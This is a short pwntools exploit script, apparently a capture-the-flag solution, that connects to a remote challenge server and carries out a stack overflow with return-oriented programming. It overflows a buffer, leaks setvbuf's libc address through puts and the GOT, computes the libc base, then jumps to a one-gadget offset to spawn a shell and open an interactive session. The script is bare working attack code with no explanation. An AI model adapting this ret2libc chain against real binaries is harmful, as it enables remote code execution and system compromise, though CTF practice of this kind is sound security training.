from pwn import *
#r=process("./chall")
r=remote("challs.xmas.htsp.ro",2001)
context.log_level='debug'
b=ELF("./chall")
prdi=0x004008e3
lib=ELF("./libc.so.6")
binsh=b'id\x00'
bss=0x602000-0x300
pay=b'x'*0x40
pay+=p64(bss+0x40)
pay+=p64(prdi)
pay+=p64(b.got['setvbuf'])
pay+=p64(b.plt['puts'])
pay+=p64(0x400807)
r.sendlineafter('\n',pay)
base=u64(r.recv(6).ljust(8,b'\x00'))-lib.symbols['setvbuf']

pay2=b'x'*0x40
pay2+=p64(bss+0x200)
pay2+=p64(0x10a41c+base)
r.sendline(pay2)
r.interactive()